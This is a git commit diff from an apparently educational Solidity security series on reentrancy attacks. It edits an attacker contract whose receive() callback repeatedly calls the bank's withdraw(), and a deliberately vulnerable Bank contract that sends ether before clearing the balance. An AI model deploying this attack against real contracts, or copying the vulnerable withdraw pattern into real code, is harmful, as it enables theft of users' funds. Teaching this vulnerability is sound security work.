fbd5db206645b0b428267a7c3a778e792da19f37
wtno <920093991@qq.com>
2023-02-13 22:42:37 +0800

    S01.重入攻击

--- contract_security/S01_ReentraAttack/Attack.sol
+++ contract_security/S01_ReentraAttack/Attack.sol
@@ -15,15 +15,15 @@ contract Attack {
     // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
     receive() external payable {
         emit attLog(bank.getBalance());
-        if (bank.getBalance() >= 1 ether) {
+        if (bank.getBalance() >= 1 wei) {
             bank.withdraw();
         }
     }
 
     // 攻击函数，调用时 msg.value 设为 1 ether
     function attack() external payable {
-        require(msg.value == 1 ether, "Require 1 Ether to attack");
-        bank.deposit{value: 1 ether}();
+        require(msg.value == 1 wei, "Require 1 Ether to attack");
+        bank.deposit{value: 1 wei}();
         bank.withdraw();
     }
 
--- contract_security/S01_ReentraAttack/Bank.sol
+++ contract_security/S01_ReentraAttack/Bank.sol
@@ -1,8 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
 
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Strings.sol';
+
 contract Bank {
+    using Strings for uint256;
     event LOG(bool success, uint256 balances);
+
+    uint256 num = 0;
 
     mapping (address => uint256) public balanceOf;    // 余额mapping
 
@@ -18,8 +23,8 @@ contract Bank {
         require(balance > 0, "Insufficient balance");
         // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
         (bool success, ) = msg.sender.call{value: balance}("");
-        emit LOG(success, balance);
-        require(success, "Failed to send Ether");
+        // emit LOG(success, balance);
+        require(success, num.toHexString());
         // 更新余额
         balanceOf[msg.sender] = 0;
     }
